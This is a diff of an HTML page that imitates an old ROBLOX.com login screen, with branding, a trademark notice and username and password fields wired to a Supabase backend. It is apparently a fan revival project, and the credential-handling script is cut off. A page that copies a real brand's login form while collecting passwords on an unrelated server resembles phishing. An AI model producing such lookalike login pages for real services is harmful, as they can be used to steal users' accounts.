@@ -2,37 +2,87 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>ROBLOX.com - Authentication</title>
+    <title>ROBLOX.com - Login</title>
     <style>
-        body { font-family: 'Lucida Grande', Verdana, sans-serif; background: #5A5A5A; margin: 0; padding: 0; color: #333; }
-        #Header { background: #E1E1E1; border-bottom: 1px solid #A7A7A7; padding: 10px; height: 45px; }
-        #Container { width: 900px; margin: 20px auto; background: #FFF; border: 1px solid #A7A7A7; padding: 25px; min-height: 400px; }
-        .auth-box { width: 400px; margin: 40px auto; border: 1px solid #CCC; padding: 20px; background: #F9F9F9; }
-        h1 { font-size: 24px; color: #003366; margin-top: 0; font-weight: normal; }
-        .form-label { display: block; font-weight: bold; margin-bottom: 5px; font-size: 12px; }
-        .form-input { width: 380px; padding: 4px; margin-bottom: 15px; border: 1px solid #7F9DB9; font-size: 13px; }
-        .button-row { margin-top: 10px; }
-        .rbx-btn { background: url('https://archive.org') repeat-x; border: 1px solid #777; color: #000; font-weight: bold; padding: 4px 12px; cursor: pointer; font-size: 13px; }
+        body { font-family: 'Lucida Grande',Verdana,sans-serif; background-color: #5A5A5A; margin: 0; padding: 0; }
+        #Banner { background: #E1E1E1 url('https://archive.org') repeat-x; border-bottom: 1px solid #A7A7A7; height: 50px; padding: 5px 20px 0 20px; }
+        #Banner .logo { float: left; margin-top: 3px; }
+        #Banner .nav { float: left; margin-left: 30px; margin-top: 15px; }
+        #Banner .nav a { font-weight: bold; color: #003366; text-decoration: none; font-size: 13px; margin-right: 15px; }
+        #Banner .nav a:hover { text-decoration: underline; }
+        #Container { width: 900px; margin: 25px auto; background-color: #FFF; border: 1px solid #A7A7A7; padding: 25px; min-height: 450px; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
+        #LeftContainer { float: left; width: 170px; border-right: 1px dashed #A7A7A7; min-height: 400px; padding-right: 15px; }
+        .menu-item { font-size: 12px; font-weight: bold; color: #003366; display: block; padding: 4px; text-decoration: none; }
+        .menu-item:hover { background-color: #E1E1E1; text-decoration: underline; }
+        #MainContent { float: right; width: 680px; padding-left: 15px; }
+        h1 { font-size: 24px; color: #003366; margin-top: 0; font-weight: normal; border-bottom: 1px solid #A7A7A7; padding-bottom: 5px; }
+        .auth-table { font-size: 13px; margin-top: 20px; border-collapse: collapse; }
+        .auth-table td { padding: 8px 5px; vertical-align: middle; }
+        .label-cell { font-weight: bold; text-align: right; width: 120px; padding-right: 15px !important; }
+        .input-text { width: 250px; border: 1px solid #7F9DB9; padding: 3px; font-size: 13px; font-family: monospace; }
+        .btn-green { background: url('https://archive.org') repeat-x; border: 1px solid #555; color: #000; font-weight: bold; height: 28px; padding: 0 15px; cursor: pointer; font-size: 13px; box-shadow: 1px 1px 1px #999; }
+        .btn-green:active { box-shadow: inset 1px 1px 2px #333; }
+        .btn-gray { background: #E1E1E1 url('https://archive.org') repeat-x; border: 1px solid #777; color: #000; font-weight: bold; height: 28px; padding: 0 15px; cursor: pointer; font-size: 13px; box-shadow: 1px 1px 1px #999; margin-left: 10px; }
+        .btn-gray:active { box-shadow: inset 1px 1px 2px #666; }
+        .footer-text { font-size: 11px; color: #555; margin-top: 40px; border-top: 1px solid #E1E1E1; padding-top: 10px; }
     </style>
     <script src="https://unpkg.com"></script>
 </head>
 <body>
-    <div id="Header">
-        <img src="https://archive.org" height="40" alt="ROBLOX">
-    </div>
-    <div id="Container">
-        <div class="auth-box">
-            <h1>Log In / Register</h1>
-            <label class="form-label">Username:</label>
-            <input type="text" id="username" class="form-input">
-            <label class="form-label">Password:</label>
-            <input type="password" id="password" class="form-input">
-            <div class="button-row">
-                <button id="loginBtn" class="rbx-btn">Log In</button>
-                <button id="registerBtn" class="rbx-btn" style="background:#E1E1E1;">Register</button>
-            </div>
+
+    <div id="Banner">
+        <div class="logo">
+            <img src="https://archive.org" height="42" alt="ROBLOX">
+        </div>
+        <div class="nav">
+            <a href="#">My ROBLOX</a>
+            <a href="#">Games</a>
+            <a href="#">Catalog</a>
+            <a href="#">People</a>
+            <a href="#">Forum</a>
         </div>
     </div>
+
+    <div id="Container">
+        <div id="LeftContainer">
+            <a href="#" class="menu-item">Home</a>
+            <a href="#" class="menu-item">Browse</a>
+            <a href="#" class="menu-item">My Wardrobe</a>
+            <a href="#" class="menu-item">Saves</a>
+            <div style="margin-top:20px; border-top:1px dashed #A7A7A7; padding-top:10px;">
+                <img src="https://archive.org" alt="Ad" width="120">
+            </div>
+        </div>
+
+        <div id="MainContent">
+            <h1>Login to ROBLOX</h1>
+            <p style="font-size:13px; color:#333; margin-bottom:20px;">Please enter your username and password to log in. If you don't have an account, enter your details and click Register.</p>
+            
+            <table class="auth-table">
+                <tr>
+                    <td class="label-cell">Character Name:</td>
+                    <td><input type="text" id="username" class="input-text"></td>
+                </tr>
+                <tr>
+                    <td class="label-cell">Password:</td>
+                    <td><input type="password" id="password" class="input-text"></td>
+                </tr>
+                <tr>
+                    <td></td>
+                    <td style="padding-top:15px;">
+                        <button id="loginBtn" class="btn-green">Log In</button>
+                        <button id="registerBtn" class="btn-gray">Sign Up</button>
+                    </td>
+                </tr>
+            </table>
+
+            <div class="footer-text">
+                ROBLOX, "Online Building Toy", characters, logos and trading dresses are trademarks of ROBLOX Corporation. ©2009
+            </div>
+        </div>
+        <div style="clear:both;"></div>
+    </div>
+
     <script>
         const supabaseUrl = 'https://supabase.co';
         const supabaseKey = 'sb_publishable_key_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNnb2lyZGZ1Y3ZpYW9rdXVldnNlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTg4MDI1NjQsImV4cCI6MjA3NDM3ODU2NH0.t1LR2xCLdL0q7XP5exF0fQ_XFW52Ifc';
